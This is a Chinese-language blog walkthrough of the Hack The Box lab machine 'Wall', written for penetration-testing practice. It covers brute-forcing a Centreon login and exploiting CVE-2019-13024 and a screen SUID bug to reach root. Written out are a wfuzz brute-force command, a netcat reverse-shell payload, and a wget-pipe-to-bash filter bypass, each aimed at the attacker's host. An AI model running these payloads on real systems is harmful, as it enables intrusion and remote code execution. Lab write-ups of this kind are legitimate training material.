> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nlPRWqDTcGchGS06CLFOwg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **169** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/208

靶机难度：初级（2.4/10）

靶机发布日期：2019 年 12 月 05 日

靶机描述：

Wall is a medium difficulty Linux machine running a vulnerable version of Centreon network monitoring software, which can be accessed through HTTP Verb Tampering. The login page can be brute-forced to gain Admin access, which is exploited to gain RCE. A compiled python file is decompiled to extract user credentials This provides access to an SUID, resulting in a root shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wKQGAXOpIazhxElBDtHJPoPzBnSw3ZFoPzicm3qK9T3l9kIrooz6yQ6Dprr6uts1QJqFiakE3tfumQ6fqRchvqwg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRbR4M2TuJiaWQY5rneoRspj8lPSDa58bicDyJeuuKM4Kn2ic96lpssiahKA/640?wx_fmt=png)  

可以看到靶机的 IP 是 10.10.10.157...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRJic67dlk64XmpMUnHgiaFCAInNVKKv7HAG0iaJGySfReu00KfuHecrNYA/640?wx_fmt=png)

我这里利用 Masscan 快速的扫描出了 22，80 端口，在利用 nmap 详细的扫描了这些端口情况.. 看图即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRlP0FE7icvTFzpBseZ6HR9DQaQJ0U2DpLxU0ibHeHanmYqJXNjMuj4wrQ/640?wx_fmt=png)

web 页面访问的是 apache...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRTGgGYBa1jKSAIYMSorgib9KAVy4UhbdCdrKn1s4swKfNHnPwH4sMY0A/640?wx_fmt=png)

爆破了目录... 枚举看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRhKW9joO5jBGMib7PAE9qu8DZjs2TOzCJNF8647xDggketEtnL85ve5A/640?wx_fmt=png)

可看到 minitoring 是个身份认证登录页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRaeHaOuvk5HmHRJHEtsSsHMR1pRSCpsgiaaXeHMehicicVSJ49OibORfAuQ/640?wx_fmt=png)

查看返回的参数，会重定向到 centreon 页面下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRx9LB6phD8BcRaCXgiaEicx78XXBNZdavYj0VmGlksgNwU8jiab1Jbd8mA/640?wx_fmt=png)

可看到该页面服务是 centreon 框架搭设的，版本是 19.04

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRu9W36WR7yEllcOz9q6RZgzbFf2HuhpLxVPQXa889WIibkpV260TrKpA/640?wx_fmt=png)

```
wfuzz -c -X POST -d "user -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http://wall.htb/centreon/api/index.php?action=authenticate
```

这里查看了该框架的 19.04 的内核漏洞，后面有介绍...

里面可看到 centreon 的源代码框架页面... 从里面收集到了爆破目录的信息..

利用 Wfuzz 枚举获得了页面的登录密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRMiaZODb62URrbn1ibCM4Rs6icEicIes5aLZTTNwqD5SKrgicNaD5pJibIPWw/640?wx_fmt=png)

登录页面后，查看版本信息... 开始利用 CVE-2019-13024 提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRZrRqian7TAO58I4eHFbrF8SqGx3z7xynTNMRSS8B0yLsU4hiaOSAZDaw/640?wx_fmt=png)

47069 下载到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRIYttjf4QPyf5kr88eWDWCunkbLSVOG3HBg53IWLDxtTWqNW23A8ibiaw/640?wx_fmt=png)

该 nagios_bin 字段是将在服务器上执行的字段...

EXP 代码也提示了执行该脚本需要用户名密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRWAKrX7OaicHwML9RnkaFMd4uqW7719Ex99c9ylic8C1vkfqonxxlRlMg/640?wx_fmt=png)

根据脚本提示执行需要的信息...

```
shell：`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1337 >/tmp/f`
```

这里需要注意的是，页面存在字符串拦截... 需要空格才可绕过... 测试了很久...

绕过：

```
wget${IFS}-qO-${IFS}http://10.10.14.8/a${IFS}|${IFS}bash;
```

可看到获得了反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMREwGjo5JM2NANK6OAqw5QvPtFibYaeHf8PLYvdwnPpcPDISjXpkmn4Jw/640?wx_fmt=png)

LinEnum 枚举发现了 SUID 存在 screen-4.5.0 二进制程序...

这里遇到了几次了... 直接找漏洞提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMR5EObe8WtXE1hUQ0Ml6yiaj397sNicTQNOqEeWQadWqjW5LibukRnHyOSA/640?wx_fmt=png)

将 41154 放入目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRgYJ4XYVgmEywHiclqiabuxnvJB4EicFm0kKXLUTXuCAJuFtnOHxyZQZQw/640?wx_fmt=png)

可看到... 本地利用 gcc 编译即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRGBr8OC1iaZlSqb6scHY9ChgwD0zrrr7iceOt5ch5ibmtWx18LrKADuG0g/640?wx_fmt=png)

编译好后开启 python 服务... 上传

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMReYz2442ZWUgVSg5OU6726cGKicmx789K3fx41weo1NSibJ3pMqfuqJBA/640?wx_fmt=png)

上传完后，利用 EXP 的方法... 执行即可... 简单

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMyFJxKsLS9TbU5jWybfCMRtibcD51ZMXtxQAKbypn9gxCYOFDQ6oG8RKbr8KO8G4ECujTgib7TQPBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)

成功获得了 root 权限，并获得了 root_flag 信息..

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台初级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)